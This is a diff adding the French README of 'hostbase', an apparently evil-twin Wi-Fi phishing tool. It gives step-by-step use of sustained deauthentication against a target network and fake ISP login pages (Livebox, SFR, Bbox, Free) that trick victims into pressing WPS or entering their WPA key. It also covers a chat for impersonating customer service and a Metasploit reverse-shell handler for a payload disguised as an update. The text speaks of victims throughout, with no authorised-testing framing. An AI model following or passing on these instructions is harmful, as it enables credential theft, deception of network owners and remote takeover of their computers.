@@ -1,0 +1,182 @@
+
+~~~~~~~~~~~~~~~~~~ Hostbase project By Koala @ crack-wifi.com @ wifi-libre.com @ kali-linux.fr ~~~~~~~~~~~~~~~~~~~~
+
+Bienvenue dans le projet hostabse.
+
+Fichier ALIREIMPORTANT fait pour les utilisateurs de kali-linux, le script fonctionne bien avec kali-linux xfce 2022.2 et kali xfce 2022.3 précisément.
+
+CHANGELOG de cette mise a jour de la version hostbase-1.5FR(septembre 2022):
+
+-Modification de la deauth en profondeur pour permettre un harcèlement quasi continu de l'AP ciblé.
+-Ajout de l'option "scan passif" qui permet de détecter si un réseau wifi vient de s'allumer ou pas.Cette option a été rajoutée si jamais on a des coupures d'électricité cette hiver a cause du manque d'énergie en France.(Merci d'utiliser cette option UNIQUEMENT en cas de coupure car sinon elle sert a rien et ne remplacera pas un bon vieux scan avec airodump-ng.)Voir ici le tuto sur airodump-ng que j'ai fais:
+
+https://instant-hack.to/threads/avoir-les-bons-réflexes-pour-utiliser-airodump-ng.207687/
+
+
+_________________________________________________
+
+Pour ceux qui ont déja installer hostbase via le script d'installation:
+ bash ainstaller.sh
+vous devez installer les paquet suivant pour utiliser cette nouvelle version de hostbase:
+apt install mdk3  (effectivement mdk3 ne fait plus parti des depots de kali 2022.3 a mon grand regret...)
+apt install wmctrl
+
+--> pour les autres se réferer a l'installation classique.
+_________________________________________________
+
+rentrer dans le dossier hostbase-hostbase ou hostbase-shell et copier le dossier hostbase-1.5FR quelque part sur votre disque.
+
+INSTALLATION CLASSIQUE:
+0- rentrer dans le dossier hostbase-1.5FR et lancer le script ainstaller.sh tel que:
+bash ainstaller.sh
+_________________________________________________
+
+1- Début de l'attaque
+
+--> Lors de la première utilisation après avoir lancer le script d'installation (bash ainstaller.sh), hostbase se lancera tout seul mais lors des utilisations suivantes suivre l'instrucion ci-dessous:
+rentrer dans le répertoire ou se situe hostbase-1.5FR et dans ce meme répertoire, lancez hostbase comme ceci:
+ruby hostbase.rb
+
+
+--> ATTENTION: ne pas oublier de commencer par le SCAN DE RÉSEAU pour éteindre network-manager qui peut poser problème par la suite <-- 
+
+
+Pour le scan de réseau il faut renseigner l'interface avec laquel faire le scan et dans "5GHz" répondre "oui" ou "non" en minuscule.Si "oui" le scan
+se fera sur les fréquences 2.4GHz et 5GHz et si "non" le scan se fera uniquement sur la fréquence 2.4GHz.
+--> Ne pas rentrer oui si votre interface wifi n'est pas compatible avec la fréquence 5GHz... <--
+Si vous rentrez autre chose que oui OU non en minuscule dans 5GHz vous aurez des erreurs.
+
+
+____________________________________________________
+
+2- Choisir son attaque, ici ça change un peu par rapport a la version de hostbase-1.4FR.
+
+Dans le champ page de phishing, vous devez entrer la page de phishing que vous souhaitez utiliser, cette nouvelle version de hostbase ne concernant que le WPS et le WPA3, vous rentrerez la page de phishing en minuscule comme ceci, chaque nom étant un choix différent:
+
+liveboxwps
+ou
+sfrwps
+ou
+bboxwps
+ou
+bboxwpa3
+ou
+freewpa3
+ou
+liveboxwpa3
+ou
+sfrwpa3
+
+Le nom de la page défini l'attaque qui sera lancée.Une page se terminant par wps présentera une page demandant l'appui du bouton wps par l'utilisateur et capturera la clé qui s'affichera dans la console de hostbase.
+Avec les réseaux en wpa3 il ne faut surtout pas choisir une page de phishing se terminant par wps.Effectivement le wps est supprimé avec l'arrivée du wpa3.Il faut choisir une page qui se termine par wpa3 qui demandera a l'utilisateur de rentrer sa clé wifi dans les champs prévus a cette effet, si la victime rentre sa lé WPA, elle apparaitra en rouge dans la console de hostbase (pensez a bien faire défiler les logs de la console vers le haut).
+On prétexte a la victime de vouloir générer un nouveau QR code en rentrant la clé WPA pour pouvoir se re connecter au réseau wifi.Les QR code seront très utilisés avec l'arrivée du wpa3 et c'est ce qu'ils appelent le "wifi easy-connect" donc pour le moment ça sert pas a grand chose car très peu de réseau sont en wpa3 et utilisent ce mode de connexion mais vous verrez dans le futur que ça servira énormément.Il faudra bien entendu que j'acutualise les pages de phishing en fonction de ce que proposeront les opérateurs.
+
+Si vous attaquez un réseau en wpa3 et que la victime rentre sa clé wpa, elle apparaitra en rouge dans la console de hostbase et en quittant hostbase avec CTRL+C dans sa console, on peut récupérer la clé wpa après l'attaque en rentrant ceci dans une autre console:
+cat /var/www/msftconnecttest/cle.txt
+
+
+Si la clé wifi est capturée avec le wps, elle est enregistrée par défaut dans le répertoire /etc/wpa_supplicant.conf, si la victime appui sur son bouton wps, la clé s'affichera dans la console de hostbase (faire défiler l'historique de la console vers le haut).Après l'attaque et etre sorti de hostbase avec CTRL+C dans sa console, ouvrez une nouvelle console pour récupérer la clé wpa puis tapez:
+cat /etc/wpa_supplicant.conf
+
+(En cas d'attaque wps, Il faut attendre un peu après avoir appuyer sur le bouton wps de la box et vérifier si la clé a été capturée, le temps que la connexion via le wps-pbc se fasse).
+
+____________________________________________________
+
+
+3- Un peu de social engineering
+
+
+Hostbase dispose d'un tchat pour se faire passer pour le service client.Après avoir lancé l'attaque vous pouvez accéder a ce tchat en suivant ce lien dans votre navigateur internet:
+
+http://127.0.0.1
+
+De la un lien "aide en ligne" apparait en bas de page, cliquez dessus pour accéder au tchat.
+
+Pour que le tchat fonctionne, vous devez envoyer un message en PREMIER, exemple:
+Nom: Technicien  Message: Service techique bonjour, comment puis-je aider ?
+
+Si l'utilisateur clique sur "aide en ligne" sur la page de phishing principale, il tombera directement sur le tchat et vous pourrez parler avec lui.
+
+
+_____________________________________________________
+
+
+4- Ce qu'il faut savoir pour bien utiliser le tool.
+
+Ce tool utilise 2 cartes wifi pour etre plus puissant (une pour le fake AP et une pour la DoS en 2.4GHz) et 3 cartes wifi avec le mode 5GHz (une pour le fake AP, une pour la DoS en 2.4GHz et une pour la DoS en 5GHz).Ça demande d'avoir un matériel exigeant mais faut savoir ce que l'on veut aussi... car maintenant presque tout les réseaux émettent sur de fréquences 2.4GHz et 5GHz.
+
+A chaque test:
+--> Il faut commencer par le scan de réseau pour oobtenir des information et éteindre network-manager qui peut poser problème.
+--> Pour arréter le programme, on clique pas sur la croix on appui sur CTRL+C dans la console de hostbase de manière a laisser tout bien propre après l'utilisation du tool...
+--> La DoS qui suit l'AP si son canal change marche avec wash, wash doit-etre installé pour que la DoS marche (ne vous inquiétez pas sous kali-linux wash est installé par défaut.)
+--> A la sortie du programme network-manager se remet en marche donc si vous voulez faire d'autres tests sans passer par le scan de réseau a chaque fois, vous devrez eteindre network-manager manuellement avec:
+
+systemctl stop NetworkManager.service
+systemctl disable NetworkManager.service
+
+
+------> ATTENTION: je recommande quand meme fortement de repasser par le scan de réseau entre 2 test d'attaques car l'AP cible peut avoir changer de canal entre temps (channel hopping).
+
+
+--> Si network-manager n'est pas eteinds vous aurez des erreurs par la suite.
+
+------> ATTENTTION: quelque soit l'option choisie, pour quitter le programme on sort toujours du programme en appuyant sur CTRL+C (que vous ayez des erreurs ou pas)
+
+------> ATTENTION: pour utiliser metasploit ou netcat en reverseshell votre payload doit pointer sur l'IP et le port de la machine attaquante (kali donc).Pour intégrer votre payload et que tout soit lancé automatiquement avec hostbase, modifiez le fichier metasploit.rc situé dans le meme dossier que hostbase-1.5FR.Par défaut le payload se trouve dans /root et s'appelle miseajour.exe voici le contenu du fichier metasploit.rc par défaut qui sera utiliser par metasploit et que vous devrez modifier avec vos paramètres AVANT de lancer hostbase.
+
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set EXE::Custom /root/miseajour.exe
+set LHOST 175.0.0.1
+set LPORT 4444
+exploit
+
+
+
+____________________________________________________
+
+
+5- Je propose mon adresse mail pour ceux qui ont besoin d'aide pour utiliser hostbase ou tout simplement ceux qui auraient envi de collaborer de de me filer un coup de main dans le futur car je manque de temps pour entretenir le projet.Voici mon mail:
+koala633@protonmail.com
+
+Discord:
+Koala63#3474
+
+ATTENTION: si vous voulez de l'aide il me faut le copier/coller de l'historique de la console ou est lancé hostbase avec les erreurs ainsi que plusieurs captures d'écrans (screenshots) qui montreront les erreurs (notamment une capture d'écran de la console ou est lancé hostbase mais AUSSI les données que vous avez rentrer dans l'interface graphique de hostbase avant de lancer l'attaque.Il me faudra aussi les retours de:
+
+ps -ef
+ifconfig -a
+
+(ces 2 commandes sont a rentrer dans une console différente que celle de hostbase).
+
+
+Si je juge que vous ne me donnez pas suffisamment d'informations pour que je puisse vous aider, je ne répondrai pas a votre e-mail.
+
+
+
+hostbase par Koala alias Flow.
+
+Programme placé sous liscenceGPLv3
+
+
+Enjoy :)
+
+
+
+
+
+	 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
